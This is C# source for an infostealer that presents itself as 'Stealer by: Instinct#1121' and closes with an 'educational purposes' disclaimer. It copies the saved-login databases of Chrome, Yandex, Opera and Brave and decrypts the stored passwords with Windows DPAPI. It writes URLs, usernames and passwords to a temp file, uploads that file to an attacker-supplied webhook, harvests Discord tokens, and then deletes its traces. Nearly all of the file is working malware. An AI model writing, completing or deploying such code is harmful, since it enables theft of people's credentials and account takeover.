using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Data.SQLite;
using System.Text;
using System.Net;
using System.Threading.Tasks;
using System.Windows;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Net.Http;
using System.Threading;


namespace ConsoleApp1
{
    class Program
    {
        public static string Webhook_link = ""; //Webhook Link
        public static void Main(string[] args)
        {
            Directory.CreateDirectory(Path.GetTempPath() + "INZ");

            string[] paths = {
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Yandex\YandexBrowser\User Data\Default\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Opera Software\Opera Stable\Login Data",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\BraveSoftware\Brave-Browser\User Data\Local State"
            };
            string pwd_text = "";

            foreach (string p in paths)
            {
                var pas = Passwords.ReadPass(p);
                if (File.Exists(p))
                {
                    pwd_text += "Stealer by: Instinct#1121\r\n\r\n";
                    pwd_text += "Version 1.5\r\n\r\n";
                    foreach (var item in pas)
                    {
                        if ((item.Item2.Length > 0) && (item.Item2.Length > 0))
                        {
                            pwd_text += "URL: " + item.Item1 + "\r\n" + "Login: " + item.Item2 + "\r\n" + "Password: " + item.Item3 + "\r\n";
                            pwd_text += " \r\n";
                        }
                    }
                }
            }
            if (File.Exists(Path.GetTempPath() + @"INZ
            \Login Data"))
            {
                File.Delete(Path.GetTempPath() + @"INZ
             \Login Data");
            }
           
            string TempPath = Path.GetTempPath();
            File.WriteAllText(TempPath + "/INZ/Passwords.txt", pwd_text);

           

            string FilePath = TempPath + "/INZ/Passwords.txt";
            using (HttpClient httpClient = new HttpClient())
            {
                MultipartFormDataContent form = new MultipartFormDataContent();
                var file_bytes = System.IO.File.ReadAllBytes(FilePath);
                form.Add(new ByteArrayContent(file_bytes, 0, file_bytes.Length), "Document", "file.txt");
                httpClient.PostAsync(Webhook_link, form).Wait();
                httpClient.Dispose();
            }
            var tokens = DiscordG.Program.GetThem();
            if (tokens.Count > 0)
            {
                DiscordG.Program.SendMeResults(tokens);
            }
            /*----------------------------------
            ------------CUSTOM CODE HERE--------
            ------------------------------------*/
           
            
           // System.Diagnostics.Process.Start("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); //RICKROLL
            Thread.Sleep(5000);
            Directory.Delete(TempPath + "/INZ/", true);

        }

        class Passwords
        {
            static public IEnumerable<Tuple<string, string, string>> ReadPass(string dbPath)
            {
                if (File.Exists(Path.GetTempPath() + @"INZ\Login Data"))   
                {
                    File.Delete(Path.GetTempPath() + @"INZ\Login Data");
                }
                File.Copy(dbPath, Path.GetTempPath() + @"INZ\Login Data");  
                dbPath = Path.GetTempPath() + @"INZ\Login Data";
                var connectionString = "Data Source=" + dbPath + ";pooling=false";
                using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
                using (var cmd = conn.CreateCommand())
                {


                    cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            var encryptedData = (byte[])reader[0];
                            var plainText = "dd";
                            try
                            {
                                //Decrypt the data using DataProtectionScope.CurrentUser.
                                var decodedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                                plainText = Encoding.ASCII.GetString(decodedData);
                               
                            }
                            catch (CryptographicException e)
                            {
                                
                                Console.WriteLine("Data was not decrypted. An error occurred."); 
                            }

                            
                            yield return Tuple.Create(reader.GetString(2), reader.GetString(1), plainText);



                        }

                    }
                    conn.Close();
                }
            }
        }
    }
    /* Made by Instinct#1121 on Discord, I am not responsible for any malicious use of this tool, I have created this for educational purposes! */
}
 
